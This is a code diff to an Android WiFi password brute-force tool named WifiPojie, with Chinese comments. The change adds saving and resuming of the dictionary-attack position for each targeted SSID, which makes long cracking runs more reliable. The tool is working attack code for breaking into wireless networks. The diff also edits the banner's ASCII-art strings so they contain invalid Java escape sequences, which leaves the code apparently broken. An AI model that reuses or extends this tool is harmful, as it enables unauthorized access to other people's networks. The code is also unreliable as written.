@@ -9,6 +9,7 @@ import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
 
+import java.io.File;
 import java.util.Map;
 import java.util.Objects;
 import java.util.concurrent.ExecutionException;
@@ -30,6 +31,9 @@ public class WifiPojie {
     private boolean isDestroyed = false;
     private int currentTryIndex;
     private final Context context;
+    private final SharedPreferences progressPrefs;
+    private static final String PREFS_PROGRESS = "wifi_pojie_progress";
+    private static final String KEY_PROGRESS_PREFIX = "progress_";
 
     /**
      * 构造函数
@@ -55,14 +59,23 @@ public class WifiPojie {
         this.logOutputFunction = logOutputFunction;
         this.progressFunction = progressFunction;
         this.endFunc = endFunc;
-        this.currentTryIndex = (int) config.get("startLine") - 1;
+        this.progressPrefs = context.getSharedPreferences(PREFS_PROGRESS, Context.MODE_PRIVATE);
+        
+        // 检查是否有保存的进度
+        int savedProgress = getSavedProgress();
+        if (savedProgress >= 0) {
+            this.currentTryIndex = savedProgress;
+            logOutputFunction.accept("恢复进度：从第 " + (currentTryIndex + 1) + " 行开始尝试");
+        } else {
+            this.currentTryIndex = (int) config.get("startLine") - 1;
+        }
 
         // 在后台线程启动破解过程
         logOutputFunction.accept("      _      __                 _        \n" +
                 "     | |___ / _|_ __ ___  _   _| |_ __ _ \n" +
-                "  _  | / __| |_| '_ ` _ \\| | | | __/ _` |\n" +
-                " | |_| \\__ \\  _| | | | | | |_| | || (_| |\n" +
-                "  \\___/|___/_| |_| |_| |_|\\__, |\\__\\__, |\n" +
+                "  _  | / __| |_| '_ ` _ \| | | | __/ _` |\n" +
+                " | |_| \__ \  _| | | | | | |_| | || (_| |\n" +
+                "  \___/|___/_| |_| |_| |_|\__, |\__\__, |\n" +
                 "                          |___/    |___/ \n" +
                 "==========================================");
         logOutputFunction.accept("wifi密码暴力破解工具v2 for Android");
@@ -140,10 +153,12 @@ public class WifiPojie {
                     // 成功连接
                     logOutputFunction.accept("成功连接到WiFi网络: " + ssid + " 密码: " + dictionary[currentTryIndex]);
                     logAttempt(ssid, currentTryIndex + 1, dictionary[currentTryIndex]);
+                    clearSavedProgress(); // 清理保存的进度
                     destroy(false);
                 } else {
                     connectWifi.forgetWifiName(ssid);
                     currentTryIndex++;
+                    saveProgress(); // 保存当前进度
                     executorService.submit(this::startCrackingProcess);
                 }
             });
@@ -232,6 +247,67 @@ public class WifiPojie {
         if (endFunc != null) {
             endFunc.run();
         }
+    }
+    
+    /**
+     * 保存当前进度
+     */
+    private void saveProgress() {
+        if (isDestroyed) return;
+        
+        SharedPreferences.Editor editor = progressPrefs.edit();
+        String key = KEY_PROGRESS_PREFIX + ssid;
+        
+        // 保存进度信息
+        JSONObject progressInfo = new JSONObject();
+        try {
+            progressInfo.put("currentTryIndex", currentTryIndex);
+            progressInfo.put("totalPasswords", dictionary.length);
+            progressInfo.put("lastUpdateTime", System.currentTimeMillis());
+            editor.putString(key, progressInfo.toString());
+            editor.apply();
+        } catch (JSONException e) {
+            Log.e("WifiPojie", "保存进度失败: " + e.getMessage());
+        }
+    }
+    
+    /**
+     * 获取保存的进度
+     * @return 保存的进度索引，-1表示没有保存的进度
+     */
+    public int getSavedProgress() {
+        String key = KEY_PROGRESS_PREFIX + ssid;
+        String progressJson = progressPrefs.getString(key, null);
+        
+        if (progressJson == null) {
+            return -1;
+        }
+        
+        try {
+            JSONObject progressInfo = new JSONObject(progressJson);
+            return progressInfo.getInt("currentTryIndex");
+        } catch (JSONException e) {
+            Log.e("WifiPojie", "读取进度失败: " + e.getMessage());
+            return -1;
+        }
+    }
+    
+    /**
+     * 清理保存的进度
+     */
+    public void clearSavedProgress() {
+        SharedPreferences.Editor editor = progressPrefs.edit();
+        String key = KEY_PROGRESS_PREFIX + ssid;
+        editor.remove(key);
+        editor.apply();
+    }
+    
+    /**
+     * 检查是否有保存的进度
+     * @return 是否有保存的进度
+     */
+    public boolean hasSavedProgress() {
+        return getSavedProgress() >= 0;
     }
 
     public void shutdownExecutorService() {
